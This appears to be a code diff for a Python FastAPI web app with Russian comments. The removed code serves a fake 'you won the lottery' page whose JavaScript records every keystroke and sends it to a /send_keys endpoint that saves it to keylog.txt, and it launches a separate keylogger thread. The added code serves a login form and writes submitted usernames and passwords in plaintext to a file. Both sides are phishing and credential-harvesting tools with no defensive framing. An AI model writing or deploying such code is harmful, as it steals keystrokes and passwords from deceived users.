@@ -1,67 +1,25 @@
-from fastapi import FastAPI, Request
+from fastapi import FastAPI, Form, HTTPException
 from fastapi.responses import HTMLResponse
-from fastapi.middleware.cors import CORSMiddleware
-import threading
-from keylogger import start_keylogger
+from fastapi.templating import Jinja2Templates
+from fastapi import Request
 
 app = FastAPI()
+templates = Jinja2Templates(directory="templates")
 
-# Разрешаем кросс-доменные запросы
-app.add_middleware(
-    CORSMiddleware,
-    allow_origins=["*"],
-    allow_credentials=True,
-    allow_methods=["*"],
-    allow_headers=["*"],
-)
+# Путь к файлу для сохранения данных
+data_file_path = "user_data.txt"
 
-# Запуск keylogger в отдельном потоке
-def main():
-    keylogger_thread = threading.Thread(target=start_keylogger)
-    keylogger_thread.start()
-
-# Эндпоинт для главной страницы
 @app.get("/", response_class=HTMLResponse)
-async def read_root():
-    return """
-    <html>
-        <head>
-            <title>Лотерея</title>
-            <script>
-                let keys = [];
-                document.addEventListener('keydown', function(event) {
-                    keys.push(event.key);
-                });
-                function sendKeys() {
-                    fetch('/send_keys', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({keys: keys.join('')})
-                    }).then(response => {
-                        alert('Ваши данные отправлены!');
-                        window.location.href = "http://example.com"; // Здесь вы можете перенаправить пользователя
-                    });
-                }
-            </script>
-        </head>
-        <body>
-            <h1>Поздравляем! Вы выиграли лотерею!</h1>
-            <button onclick="sendKeys()">Забрать приз</button>
-        </body>
-    </html>
-    """
+async def read_login(request: Request):
+    return templates.TemplateResponse("login.html", {"request": request})
 
-# Эндпоинт для отправки нажатий клавиш
-@app.post("/send_keys")
-async def send_keys(request: Request):
-    data = await request.json()
-    with open("keylog.txt", "a") as f:
-        f.write(data['keys'] + "\n")  # Сохраняем нажатия клавиш в файл
-    return {"status": "success"}
+@app.post("/")
+async def create_user(username: str = Form(...), password: str = Form(...)):
+    if not username or not password:
+        raise HTTPException(status_code=400, detail="Username and password are required")
 
-if __name__ == "__main__":
-    main()
+    # Записываем данные в файл
+    with open(data_file_path, "a") as f:
+        f.write(f"Username: {username}, Password: {password}\n")
 
-#1
+    return {"username": username, "message": "Data saved successfully"}
